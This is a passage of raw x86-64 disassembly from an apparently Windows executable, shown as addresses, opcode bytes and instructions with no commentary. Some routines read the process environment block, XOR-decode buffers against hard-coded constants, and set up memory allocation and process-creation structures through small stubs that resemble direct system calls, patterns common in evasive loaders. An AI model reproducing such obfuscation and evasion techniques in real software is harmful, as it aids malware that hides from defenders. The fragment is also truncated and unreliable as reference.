   140002f1e:	48 89 c1             	mov    %rax,%rcx
   140002f21:	c6 80 a2 00 00 00 01 	movb   $0x1,0xa2(%rax)
   140002f28:	e8 9b 8b 00 00       	call   0x14000bac8
   140002f2d:	41 c6 45 00 01       	movb   $0x1,0x0(%r13)
   140002f32:	45 31 c0             	xor    %r8d,%r8d
   140002f35:	4c 89 e2             	mov    %r12,%rdx
   140002f38:	48 8d 0d d1 8e 00 00 	lea    0x8ed1(%rip),%rcx        # 0x14000be10
   140002f3f:	e8 9c 30 00 00       	call   0x140005fe0
   140002f44:	e9 eb ed ff ff       	jmp    0x140001d34
   140002f49:	e8 52 39 00 00       	call   0x1400068a0
   140002f4e:	48 8d 0d db 8d 00 00 	lea    0x8ddb(%rip),%rcx        # 0x14000bd30
   140002f55:	45 31 c0             	xor    %r8d,%r8d
   140002f58:	48 89 c6             	mov    %rax,%rsi
   140002f5b:	c6 40 4e 01          	movb   $0x1,0x4e(%rax)
   140002f5f:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   140002f66:	00 
   140002f67:	48 89 f2             	mov    %rsi,%rdx
   140002f6a:	48 89 06             	mov    %rax,(%rsi)
   140002f6d:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   140002f74:	00 
   140002f75:	48 89 46 08          	mov    %rax,0x8(%rsi)
   140002f79:	48 8b 84 24 50 15 00 	mov    0x1550(%rsp),%rax
   140002f80:	00 
   140002f81:	48 89 46 10          	mov    %rax,0x10(%rsi)
   140002f85:	48 8b 84 24 58 15 00 	mov    0x1558(%rsp),%rax
   140002f8c:	00 
   140002f8d:	48 89 46 18          	mov    %rax,0x18(%rsi)
   140002f91:	48 8b 84 24 60 15 00 	mov    0x1560(%rsp),%rax
   140002f98:	00 
   140002f99:	48 89 46 20          	mov    %rax,0x20(%rsi)
   140002f9d:	48 8b 84 24 68 15 00 	mov    0x1568(%rsp),%rax
   140002fa4:	00 
   140002fa5:	48 89 46 28          	mov    %rax,0x28(%rsi)
   140002fa9:	48 8b 84 24 70 15 00 	mov    0x1570(%rsp),%rax
   140002fb0:	00 
   140002fb1:	48 89 46 30          	mov    %rax,0x30(%rsi)
   140002fb5:	48 8b 84 24 78 15 00 	mov    0x1578(%rsp),%rax
   140002fbc:	00 
   140002fbd:	48 89 46 38          	mov    %rax,0x38(%rsi)
   140002fc1:	48 8b 84 24 80 15 00 	mov    0x1580(%rsp),%rax
   140002fc8:	00 
   140002fc9:	48 89 46 40          	mov    %rax,0x40(%rsi)
   140002fcd:	48 8b 84 24 86 15 00 	mov    0x1586(%rsp),%rax
   140002fd4:	00 
   140002fd5:	48 89 46 46          	mov    %rax,0x46(%rsi)
   140002fd9:	41 c6 04 24 01       	movb   $0x1,(%r12)
   140002fde:	e8 fd 2f 00 00       	call   0x140005fe0
   140002fe3:	e9 c6 ec ff ff       	jmp    0x140001cae
   140002fe8:	e8 b3 38 00 00       	call   0x1400068a0
   140002fed:	48 8d 0d 3c 8c 00 00 	lea    0x8c3c(%rip),%rcx        # 0x14000bc30
   140002ff4:	45 31 c0             	xor    %r8d,%r8d
   140002ff7:	48 89 c5             	mov    %rax,%rbp
   140002ffa:	c6 40 14 01          	movb   $0x1,0x14(%rax)
   140002ffe:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   140003005:	00 
   140003006:	48 89 ea             	mov    %rbp,%rdx
   140003009:	48 89 45 00          	mov    %rax,0x0(%rbp)
   14000300d:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   140003014:	00 
   140003015:	48 89 45 08          	mov    %rax,0x8(%rbp)
   140003019:	8b 84 24 50 15 00 00 	mov    0x1550(%rsp),%eax
   140003020:	89 45 10             	mov    %eax,0x10(%rbp)
   140003023:	c6 06 01             	movb   $0x1,(%rsi)
   140003026:	e8 b5 2f 00 00       	call   0x140005fe0
   14000302b:	e9 03 ea ff ff       	jmp    0x140001a33
   140003030:	48 8d 0d a9 a8 00 00 	lea    0xa8a9(%rip),%rcx        # 0x14000d8e0
   140003037:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000303c:	e8 5f 38 00 00       	call   0x1400068a0
   140003041:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140003046:	45 31 c0             	xor    %r8d,%r8d
   140003049:	c6 40 36 01          	movb   $0x1,0x36(%rax)
   14000304d:	48 8d 0d ac 8c 00 00 	lea    0x8cac(%rip),%rcx        # 0x14000bd00
   140003054:	49 89 c2             	mov    %rax,%r10
   140003057:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   14000305e:	00 
   14000305f:	4c 89 54 24 48       	mov    %r10,0x48(%rsp)
   140003064:	49 89 02             	mov    %rax,(%r10)
   140003067:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   14000306e:	00 
   14000306f:	49 89 42 08          	mov    %rax,0x8(%r10)
   140003073:	48 8b 84 24 50 15 00 	mov    0x1550(%rsp),%rax
   14000307a:	00 
   14000307b:	49 89 42 10          	mov    %rax,0x10(%r10)
   14000307f:	48 8b 84 24 58 15 00 	mov    0x1558(%rsp),%rax
   140003086:	00 
   140003087:	49 89 42 18          	mov    %rax,0x18(%r10)
   14000308b:	48 8b 84 24 60 15 00 	mov    0x1560(%rsp),%rax
   140003092:	00 
   140003093:	49 89 42 20          	mov    %rax,0x20(%r10)
   140003097:	48 8b 84 24 68 15 00 	mov    0x1568(%rsp),%rax
   14000309e:	00 
   14000309f:	49 89 42 28          	mov    %rax,0x28(%r10)
   1400030a3:	48 8b 84 24 6e 15 00 	mov    0x156e(%rsp),%rax
   1400030aa:	00 
   1400030ab:	49 89 42 2e          	mov    %rax,0x2e(%r10)
   1400030af:	c6 02 01             	movb   $0x1,(%rdx)
   1400030b2:	4c 89 d2             	mov    %r10,%rdx
   1400030b5:	e8 26 2f 00 00       	call   0x140005fe0
   1400030ba:	4c 8b 54 24 48       	mov    0x48(%rsp),%r10
   1400030bf:	e9 c7 f2 ff ff       	jmp    0x14000238b
   1400030c4:	4c 8d b4 24 30 13 00 	lea    0x1330(%rsp),%r14
   1400030cb:	00 
   1400030cc:	31 d2                	xor    %edx,%edx
   1400030ce:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400030d4:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   1400030d9:	4c 89 f1             	mov    %r14,%rcx
   1400030dc:	e8 ef 89 00 00       	call   0x14000bad0
   1400030e1:	4d 8b 44 24 10       	mov    0x10(%r12),%r8
   1400030e6:	48 89 da             	mov    %rbx,%rdx
   1400030e9:	4c 89 f1             	mov    %r14,%rcx
   1400030ec:	e8 ef 10 00 00       	call   0x1400041e0
   1400030f1:	31 d2                	xor    %edx,%edx
   1400030f3:	41 b8 fe ff 00 00    	mov    $0xfffe,%r8d
   1400030f9:	48 89 f1             	mov    %rsi,%rcx
   1400030fc:	e8 cf 89 00 00       	call   0x14000bad0
   140003101:	4d 8b 44 24 18       	mov    0x18(%r12),%r8
   140003106:	4c 89 f2             	mov    %r14,%rdx
   140003109:	48 89 f1             	mov    %rsi,%rcx
   14000310c:	e8 cf 10 00 00       	call   0x1400041e0
   140003111:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   140003116:	45 85 c9             	test   %r9d,%r9d
   140003119:	0f 85 7d 01 00 00    	jne    0x14000329c
   14000311f:	4c 63 05 fa d5 19 00 	movslq 0x19d5fa(%rip),%r8        # 0x1401a0720
   140003126:	48 8d 15 f3 d3 01 00 	lea    0x1d3f3(%rip),%rdx        # 0x140020520
   14000312d:	49 8b 4c 24 08       	mov    0x8(%r12),%rcx
   140003132:	4d 89 f1             	mov    %r14,%r9
   140003135:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000313a:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   140003141:	00 
   140003142:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003147:	e8 e4 e4 ff ff       	call   0x140001630
   14000314c:	e9 17 fc ff ff       	jmp    0x140002d68
   140003151:	48 8d 94 24 30 13 00 	lea    0x1330(%rsp),%rdx
   140003158:	00 
   140003159:	4c 89 e9             	mov    %r13,%rcx
   14000315c:	e8 2f 15 00 00       	call   0x140004690
   140003161:	44 8b 84 24 30 13 00 	mov    0x1330(%rsp),%r8d
   140003168:	00 
   140003169:	4c 89 e1             	mov    %r12,%rcx
   14000316c:	48 89 c2             	mov    %rax,%rdx
   14000316f:	e8 cc 16 00 00       	call   0x140004840
   140003174:	41 b8 f0 01 00 00    	mov    $0x1f0,%r8d
   14000317a:	48 89 f1             	mov    %rsi,%rcx
   14000317d:	48 8d 15 5c a1 00 00 	lea    0xa15c(%rip),%rdx        # 0x14000d2e0
   140003184:	e8 3f 89 00 00       	call   0x14000bac8
   140003189:	48 8d 0d f0 a6 00 00 	lea    0xa6f0(%rip),%rcx        # 0x14000d880
   140003190:	e8 0b 37 00 00       	call   0x1400068a0
   140003195:	48 8d 0d c4 a6 00 00 	lea    0xa6c4(%rip),%rcx        # 0x14000d860
   14000319c:	80 38 00             	cmpb   $0x0,(%rax)
   14000319f:	49 89 c5             	mov    %rax,%r13
   1400031a2:	0f 84 07 01 00 00    	je     0x1400032af
   1400031a8:	e8 f3 36 00 00       	call   0x1400068a0
   1400031ad:	48 89 c7             	mov    %rax,%rdi
   1400031b0:	80 bf f0 01 00 00 00 	cmpb   $0x0,0x1f0(%rdi)
   1400031b7:	74 36                	je     0x1400031ef
   1400031b9:	49 b8 e7 9b 9d 8b 0f 	movabs $0x717f5d0f8b9d9be7,%r8
   1400031c0:	5d 7f 71 
   1400031c3:	31 c0                	xor    %eax,%eax
   1400031c5:	0f 1f 00             	nopl   (%rax)
   1400031c8:	48 89 c1             	mov    %rax,%rcx
   1400031cb:	4c 89 c2             	mov    %r8,%rdx
   1400031ce:	83 e1 07             	and    $0x7,%ecx
   1400031d1:	48 c1 e1 03          	shl    $0x3,%rcx
   1400031d5:	48 d3 ea             	shr    %cl,%rdx
   1400031d8:	66 31 14 47          	xor    %dx,(%rdi,%rax,2)
   1400031dc:	48 83 c0 01          	add    $0x1,%rax
   1400031e0:	48 3d f8 00 00 00    	cmp    $0xf8,%rax
   1400031e6:	75 e0                	jne    0x1400031c8
   1400031e8:	c6 87 f0 01 00 00 00 	movb   $0x0,0x1f0(%rdi)
   1400031ef:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   1400031f4:	49 89 f9             	mov    %rdi,%r9
   1400031f7:	49 89 e8             	mov    %rbp,%r8
   1400031fa:	48 89 da             	mov    %rbx,%rdx
   1400031fd:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140003202:	31 c9                	xor    %ecx,%ecx
   140003204:	e8 37 09 00 00       	call   0x140003b40
   140003209:	e9 63 fb ff ff       	jmp    0x140002d71
   14000320e:	e8 8d 36 00 00       	call   0x1400068a0
   140003213:	48 8d 0d 66 8b 00 00 	lea    0x8b66(%rip),%rcx        # 0x14000bd80
   14000321a:	45 31 c0             	xor    %r8d,%r8d
   14000321d:	48 89 c7             	mov    %rax,%rdi
   140003220:	c6 40 08 01          	movb   $0x1,0x8(%rax)
   140003224:	48 b8 cb df b2 1d 6f 	movabs $0x3bc5c56f1db2dfcb,%rax
   14000322b:	c5 c5 3b 
   14000322e:	48 89 07             	mov    %rax,(%rdi)
   140003231:	48 89 fa             	mov    %rdi,%rdx
   140003234:	41 c6 04 24 01       	movb   $0x1,(%r12)
   140003239:	e8 a2 2d 00 00       	call   0x140005fe0
   14000323e:	e9 53 f4 ff ff       	jmp    0x140002696
   140003243:	e8 58 36 00 00       	call   0x1400068a0
   140003248:	48 8d 0d 51 8a 00 00 	lea    0x8a51(%rip),%rcx        # 0x14000bca0
   14000324f:	45 31 c0             	xor    %r8d,%r8d
   140003252:	49 89 c4             	mov    %rax,%r12
   140003255:	c6 40 1c 01          	movb   $0x1,0x1c(%rax)
   140003259:	48 8b 84 24 40 15 00 	mov    0x1540(%rsp),%rax
   140003260:	00 
   140003261:	4c 89 e2             	mov    %r12,%rdx
   140003264:	49 89 04 24          	mov    %rax,(%r12)
   140003268:	48 8b 84 24 48 15 00 	mov    0x1548(%rsp),%rax
   14000326f:	00 
   140003270:	49 89 44 24 08       	mov    %rax,0x8(%r12)
   140003275:	48 8b 84 24 50 15 00 	mov    0x1550(%rsp),%rax
   14000327c:	00 
   14000327d:	49 89 44 24 10       	mov    %rax,0x10(%r12)
   140003282:	8b 84 24 58 15 00 00 	mov    0x1558(%rsp),%eax
   140003289:	41 89 44 24 18       	mov    %eax,0x18(%r12)
   14000328e:	c6 45 00 01          	movb   $0x1,0x0(%rbp)
   140003292:	e8 49 2d 00 00       	call   0x140005fe0
   140003297:	e9 b6 f1 ff ff       	jmp    0x140002452
   14000329c:	4c 63 05 9d 3e 38 00 	movslq 0x383e9d(%rip),%r8        # 0x140387140
   1400032a3:	48 8d 15 96 d4 19 00 	lea    0x19d496(%rip),%rdx        # 0x1401a0740
   1400032aa:	e9 7e fe ff ff       	jmp    0x14000312d
   1400032af:	e8 ec 35 00 00       	call   0x1400068a0
   1400032b4:	48 89 f2             	mov    %rsi,%rdx
   1400032b7:	41 b8 f0 01 00 00    	mov    $0x1f0,%r8d
   1400032bd:	48 89 c7             	mov    %rax,%rdi
   1400032c0:	48 89 c1             	mov    %rax,%rcx
   1400032c3:	c6 80 f0 01 00 00 01 	movb   $0x1,0x1f0(%rax)
   1400032ca:	e8 f9 87 00 00       	call   0x14000bac8
   1400032cf:	41 c6 45 00 01       	movb   $0x1,0x0(%r13)
   1400032d4:	45 31 c0             	xor    %r8d,%r8d
   1400032d7:	48 89 fa             	mov    %rdi,%rdx
   1400032da:	48 8d 0d ff 89 00 00 	lea    0x89ff(%rip),%rcx        # 0x14000bce0
   1400032e1:	e8 fa 2c 00 00       	call   0x140005fe0
   1400032e6:	e9 c5 fe ff ff       	jmp    0x1400031b0
   1400032eb:	90                   	nop
   1400032ec:	90                   	nop
   1400032ed:	90                   	nop
   1400032ee:	90                   	nop
   1400032ef:	90                   	nop
   1400032f0:	41 57                	push   %r15
   1400032f2:	b8 b8 05 01 00       	mov    $0x105b8,%eax
   1400032f7:	41 56                	push   %r14
   1400032f9:	41 55                	push   %r13
   1400032fb:	41 54                	push   %r12
   1400032fd:	55                   	push   %rbp
   1400032fe:	57                   	push   %rdi
   1400032ff:	56                   	push   %rsi
   140003300:	53                   	push   %rbx
   140003301:	e8 0a 34 00 00       	call   0x140006710
   140003306:	48 29 c4             	sub    %rax,%rsp
   140003309:	0f 29 b4 24 80 05 01 	movaps %xmm6,0x10580(%rsp)
   140003310:	00 
   140003311:	0f 29 bc 24 90 05 01 	movaps %xmm7,0x10590(%rsp)
   140003318:	00 
   140003319:	44 0f 29 84 24 a0 05 	movaps %xmm8,0x105a0(%rsp)
   140003320:	01 00 
   140003322:	48 8d 9c 24 ac 00 00 	lea    0xac(%rsp),%rbx
   140003329:	00 
   14000332a:	49 89 cc             	mov    %rcx,%r12
   14000332d:	48 89 d7             	mov    %rdx,%rdi
   140003330:	c7 84 24 ac 00 00 00 	movl   $0x0,0xac(%rsp)
   140003337:	00 00 00 00 
   14000333b:	31 d2                	xor    %edx,%edx
   14000333d:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003342:	4d 89 c6             	mov    %r8,%r14
   140003345:	4d 89 cf             	mov    %r9,%r15
   140003348:	45 31 c0             	xor    %r8d,%r8d
   14000334b:	49 89 d9             	mov    %rbx,%r9
   14000334e:	e8 26 1f 00 00       	call   0x140005279
   140003353:	8b 84 24 ac 00 00 00 	mov    0xac(%rsp),%eax
   14000335a:	45 31 c0             	xor    %r8d,%r8d
   14000335d:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003364:	00 
   140003365:	48 8d 94 24 b0 00 00 	lea    0xb0(%rsp),%rdx
   14000336c:	00 
   14000336d:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140003374:	00 
   140003375:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000337c:	4c 8d 8c 24 b8 00 00 	lea    0xb8(%rsp),%r9
   140003383:	00 
   140003384:	48 c7 84 24 b0 00 00 	movq   $0x0,0xb0(%rsp)
   14000338b:	00 00 00 00 00 
   140003390:	48 89 84 24 b8 00 00 	mov    %rax,0xb8(%rsp)
   140003397:	00 
   140003398:	e8 3d 1e 00 00       	call   0x1400051da
   14000339d:	85 c0                	test   %eax,%eax
   14000339f:	0f 89 ab 05 00 00    	jns    0x140003950
   1400033a5:	48 c7 84 24 c0 00 00 	movq   $0xffffffffffffffff,0xc0(%rsp)
   1400033ac:	00 ff ff ff ff 
   1400033b1:	48 8d ac 24 70 03 00 	lea    0x370(%rsp),%rbp
   1400033b8:	00 
   1400033b9:	4c 8d 84 24 c8 00 00 	lea    0xc8(%rsp),%r8
   1400033c0:	00 
   1400033c1:	ba 01 00 00 00       	mov    $0x1,%edx
   1400033c6:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400033cd:	48 c7 84 24 c8 00 00 	movq   $0x0,0xc8(%rsp)
   1400033d4:	00 00 00 00 00 
   1400033d9:	e8 4d 1e 00 00       	call   0x14000522b
   1400033de:	31 d2                	xor    %edx,%edx
   1400033e0:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   1400033e6:	48 89 e9             	mov    %rbp,%rcx
   1400033e9:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   1400033f0:	00 00 
   1400033f2:	4c 8b 68 20          	mov    0x20(%rax),%r13
   1400033f6:	e8 d5 86 00 00       	call   0x14000bad0
   1400033fb:	48 8b 05 1e 5f 38 00 	mov    0x385f1e(%rip),%rax        # 0x140389320
   140003402:	41 ba ff 47 00 00    	mov    $0x47ff,%r10d
   140003408:	66 44 89 94 24 88 05 	mov    %r10w,0x588(%rsp)
   14000340f:	00 00 
   140003411:	48 8d 0d 08 40 38 00 	lea    0x384008(%rip),%rcx        # 0x140387420
   140003418:	48 89 84 24 80 05 00 	mov    %rax,0x580(%rsp)
   14000341f:	00 
   140003420:	e8 7b 34 00 00       	call   0x1400068a0
   140003425:	48 8d 0d d4 3f 38 00 	lea    0x383fd4(%rip),%rcx        # 0x140387400
   14000342c:	80 38 00             	cmpb   $0x0,(%rax)
   14000342f:	48 89 c6             	mov    %rax,%rsi
   140003432:	0f 84 a0 04 00 00    	je     0x1400038d8
   140003438:	e8 63 34 00 00       	call   0x1400068a0
   14000343d:	48 89 c3             	mov    %rax,%rbx
   140003440:	80 7b 0a 00          	cmpb   $0x0,0xa(%rbx)
   140003444:	74 17                	je     0x14000345d
   140003446:	48 b8 bf 9d 9d ef ef 	movabs $0xff8585efef9d9dbf,%rax
   14000344d:	85 85 ff 
   140003450:	c6 43 0a 00          	movb   $0x0,0xa(%rbx)
   140003454:	48 31 03             	xor    %rax,(%rbx)
   140003457:	66 81 73 08 ff 47    	xorw   $0x47ff,0x8(%rbx)
   14000345d:	49 89 f8             	mov    %rdi,%r8
   140003460:	48 89 da             	mov    %rbx,%rdx
   140003463:	48 89 e9             	mov    %rbp,%rcx
   140003466:	e8 75 0d 00 00       	call   0x1400041e0
   14000346b:	48 89 e9             	mov    %rbp,%rcx
   14000346e:	e8 a5 86 00 00       	call   0x14000bb18
   140003473:	4d 85 ff             	test   %r15,%r15
   140003476:	8d 34 00             	lea    (%rax,%rax,1),%esi
   140003479:	0f 84 99 04 00 00    	je     0x140003918
   14000347f:	48 8d bc 24 60 01 00 	lea    0x160(%rsp),%rdi
   140003486:	00 
   140003487:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000348d:	31 d2                	xor    %edx,%edx
   14000348f:	48 89 f9             	mov    %rdi,%rcx
   140003492:	bb 08 02 00 00       	mov    $0x208,%ebx
   140003497:	e8 34 86 00 00       	call   0x14000bad0
   14000349c:	4c 89 fa             	mov    %r15,%rdx
   14000349f:	48 89 f9             	mov    %rdi,%rcx
   1400034a2:	e8 69 86 00 00       	call   0x14000bb10
   1400034a7:	48 89 f9             	mov    %rdi,%rcx
   1400034aa:	e8 69 86 00 00       	call   0x14000bb18
   1400034af:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   1400034b4:	01 c0                	add    %eax,%eax
   1400034b6:	0f b7 c0             	movzwl %ax,%eax
   1400034b9:	0d 00 00 08 02       	or     $0x2080000,%eax
   1400034be:	4d 85 f6             	test   %r14,%r14
   1400034c1:	89 84 24 8c 00 00 00 	mov    %eax,0x8c(%rsp)
   1400034c8:	0f 84 70 04 00 00    	je     0x14000393e
   1400034ce:	48 8d bc 24 80 05 00 	lea    0x580(%rsp),%rdi
   1400034d5:	00 
   1400034d6:	41 b8 fe ff 00 00    	mov    $0xfffe,%r8d
   1400034dc:	31 d2                	xor    %edx,%edx
   1400034de:	48 89 f9             	mov    %rdi,%rcx
   1400034e1:	66 48 0f 6e f7       	movq   %rdi,%xmm6
   1400034e6:	e8 e5 85 00 00       	call   0x14000bad0
   1400034eb:	4c 89 f2             	mov    %r14,%rdx
   1400034ee:	48 89 f9             	mov    %rdi,%rcx
   1400034f1:	e8 1a 86 00 00       	call   0x14000bb10
   1400034f6:	48 89 f9             	mov    %rdi,%rcx
   1400034f9:	e8 1a 86 00 00       	call   0x14000bb18
   1400034fe:	44 8d 34 00          	lea    (%rax,%rax,1),%r14d
   140003502:	48 8d bc 24 aa 00 00 	lea    0xaa(%rsp),%rdi
   140003509:	00 
   14000350a:	31 c0                	xor    %eax,%eax
   14000350c:	48 89 f9             	mov    %rdi,%rcx
   14000350f:	66 89 84 24 aa 00 00 	mov    %ax,0xaa(%rsp)
   140003516:	00 
   140003517:	e8 fc 85 00 00       	call   0x14000bb18
   14000351c:	4c 8d bc 24 d8 00 00 	lea    0xd8(%rsp),%r15
   140003523:	00 
   140003524:	48 89 f9             	mov    %rdi,%rcx
   140003527:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000352c:	e8 e7 85 00 00       	call   0x14000bb18
   140003531:	48 89 f9             	mov    %rdi,%rcx
   140003534:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140003539:	e8 da 85 00 00       	call   0x14000bb18
   14000353e:	44 0f b7 de          	movzwl %si,%r11d
   140003542:	45 0f b7 d6          	movzwl %r14w,%r10d
   140003546:	4d 89 f9             	mov    %r15,%r9
   140003549:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140003550:	00 
   140003551:	41 0f b7 45 50       	movzwl 0x50(%r13),%eax
   140003556:	45 31 c0             	xor    %r8d,%r8d
   140003559:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003560:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003567:	00 
   140003568:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   14000356f:	00 
   140003570:	44 89 9c 24 9c 00 00 	mov    %r11d,0x9c(%rsp)
   140003577:	00 
   140003578:	42 8d 84 18 16 04 00 	lea    0x416(%rax,%r11,1),%eax
   14000357f:	00 
   140003580:	44 89 94 24 98 00 00 	mov    %r10d,0x98(%rsp)
   140003587:	00 
   140003588:	48 c7 84 24 d0 00 00 	movq   $0x0,0xd0(%rsp)
   14000358f:	00 00 00 00 00 
   140003594:	01 d8                	add    %ebx,%eax
   140003596:	42 8d 14 10          	lea    (%rax,%r10,1),%edx
   14000359a:	66 0f 6e ca          	movd   %edx,%xmm1
   14000359e:	48 89 94 24 d8 00 00 	mov    %rdx,0xd8(%rsp)
   1400035a5:	00 
   1400035a6:	48 8d 94 24 d0 00 00 	lea    0xd0(%rsp),%rdx
   1400035ad:	00 
   1400035ae:	66 0f 70 f9 e0       	pshufd $0xe0,%xmm1,%xmm7
   1400035b3:	48 89 94 24 90 00 00 	mov    %rdx,0x90(%rsp)
   1400035ba:	00 
   1400035bb:	e8 1a 1c 00 00       	call   0x1400051da
   1400035c0:	48 8b 05 61 5d 38 00 	mov    0x385d61(%rip),%rax        # 0x140389328
   1400035c7:	66 0f ef c0          	pxor   %xmm0,%xmm0
   1400035cb:	ba 02 00 00 00       	mov    $0x2,%edx
   1400035d0:	48 8b 9c 24 d0 00 00 	mov    0xd0(%rsp),%rbx
   1400035d7:	00 
   1400035d8:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400035de:	8b 8c 24 8c 00 00 00 	mov    0x8c(%rsp),%ecx
   1400035e5:	44 8b 9c 24 9c 00 00 	mov    0x9c(%rsp),%r11d
   1400035ec:	00 
   1400035ed:	44 8b 94 24 98 00 00 	mov    0x98(%rsp),%r10d
   1400035f4:	00 
   1400035f5:	48 89 43 08          	mov    %rax,0x8(%rbx)
   1400035f9:	8d 46 02             	lea    0x2(%rsi),%eax
   1400035fc:	0f b7 f6             	movzwl %si,%esi
   1400035ff:	89 4b 38             	mov    %ecx,0x38(%rbx)
   140003602:	c1 e0 10             	shl    $0x10,%eax
   140003605:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000360a:	44 09 d8             	or     %r11d,%eax
   14000360d:	0f 11 43 20          	movups %xmm0,0x20(%rbx)
   140003611:	f3 41 0f 6f 55 50    	movdqu 0x50(%r13),%xmm2
   140003617:	66 0f 6f c6          	movdqa %xmm6,%xmm0
   14000361b:	89 43 60             	mov    %eax,0x60(%rbx)
   14000361e:	41 8d 46 02          	lea    0x2(%r14),%eax
   140003622:	41 0f 16 85 80 00 00 	movhps 0x80(%r13),%xmm0
   140003629:	00 
   14000362a:	c1 e0 10             	shl    $0x10,%eax
   14000362d:	0f 11 53 50          	movups %xmm2,0x50(%rbx)
   140003631:	44 09 d0             	or     %r10d,%eax
   140003634:	48 89 4b 40          	mov    %rcx,0x40(%rbx)
   140003638:	0f b7 4c 24 70       	movzwl 0x70(%rsp),%ecx
   14000363d:	89 43 70             	mov    %eax,0x70(%rbx)
   140003640:	0f b7 44 24 78       	movzwl 0x78(%rsp),%eax
   140003645:	66 0f d6 3b          	movq   %xmm7,(%rbx)
   140003649:	0f 11 43 78          	movups %xmm0,0x78(%rbx)
   14000364d:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140003651:	01 c9                	add    %ecx,%ecx
   140003653:	0f 11 83 88 00 00 00 	movups %xmm0,0x88(%rbx)
   14000365a:	66 89 8b b0 00 00 00 	mov    %cx,0xb0(%rbx)
   140003661:	01 c0                	add    %eax,%eax
   140003663:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003668:	0f 11 83 98 00 00 00 	movups %xmm0,0x98(%rbx)
   14000366f:	66 89 93 b2 00 00 00 	mov    %dx,0xb2(%rbx)
   140003676:	48 89 bb b8 00 00 00 	mov    %rdi,0xb8(%rbx)
   14000367d:	66 89 83 c0 00 00 00 	mov    %ax,0xc0(%rbx)
   140003684:	66 89 8b c2 00 00 00 	mov    %cx,0xc2(%rbx)
   14000368b:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140003690:	48 c7 43 10 fd ff ff 	movq   $0xfffffffffffffffd,0x10(%rbx)
   140003697:	ff 
   140003698:	c7 43 18 00 00 00 00 	movl   $0x0,0x18(%rbx)
   14000369f:	48 c7 43 30 00 00 00 	movq   $0x0,0x30(%rbx)
   1400036a6:	00 
   1400036a7:	48 c7 43 48 00 00 00 	movq   $0x0,0x48(%rbx)
   1400036ae:	00 
   1400036af:	48 89 6b 68          	mov    %rbp,0x68(%rbx)
   1400036b3:	c7 83 a8 00 00 00 00 	movl   $0x0,0xa8(%rbx)
   1400036ba:	00 00 00 
   1400036bd:	48 89 bb c8 00 00 00 	mov    %rdi,0xc8(%rbx)
   1400036c4:	0f b7 84 24 80 00 00 	movzwl 0x80(%rsp),%eax
   1400036cb:	00 
   1400036cc:	48 89 bb d8 00 00 00 	mov    %rdi,0xd8(%rbx)
   1400036d3:	48 8d bc 24 08 01 00 	lea    0x108(%rsp),%rdi
   1400036da:	00 
   1400036db:	66 44 89 83 d2 00 00 	mov    %r8w,0xd2(%rbx)
   1400036e2:	00 
   1400036e3:	45 31 c0             	xor    %r8d,%r8d
   1400036e6:	c7 83 e0 00 00 00 00 	movl   $0x0,0xe0(%rbx)
   1400036ed:	00 00 00 
   1400036f0:	48 c7 83 e8 00 00 00 	movq   $0x0,0xe8(%rbx)
   1400036f7:	00 00 00 00 
   1400036fb:	01 c0                	add    %eax,%eax
   1400036fd:	66 89 83 d0 00 00 00 	mov    %ax,0xd0(%rbx)
   140003704:	49 8b 85 f0 03 00 00 	mov    0x3f0(%r13),%rax
   14000370b:	4c 8d ac 24 e8 00 00 	lea    0xe8(%rsp),%r13
   140003712:	00 
   140003713:	48 c7 83 f8 03 00 00 	movq   $0x0,0x3f8(%rbx)
   14000371a:	00 00 00 00 
   14000371e:	4d 89 e9             	mov    %r13,%r9
   140003721:	48 c7 84 24 00 01 00 	movq   $0x58,0x100(%rsp)
   140003728:	00 58 00 00 00 
   14000372d:	48 c7 84 24 e0 00 00 	movq   $0x0,0xe0(%rsp)
   140003734:	00 00 00 00 00 
   140003739:	48 89 83 f0 03 00 00 	mov    %rax,0x3f0(%rbx)
   140003740:	31 c0                	xor    %eax,%eax
   140003742:	f3 48 ab             	rep stos %rax,(%rdi)
   140003745:	48 8d bc 24 e0 00 00 	lea    0xe0(%rsp),%rdi
   14000374c:	00 
   14000374d:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003754:	00 
   140003755:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000375c:	48 89 fa             	mov    %rdi,%rdx
   14000375f:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140003766:	00 
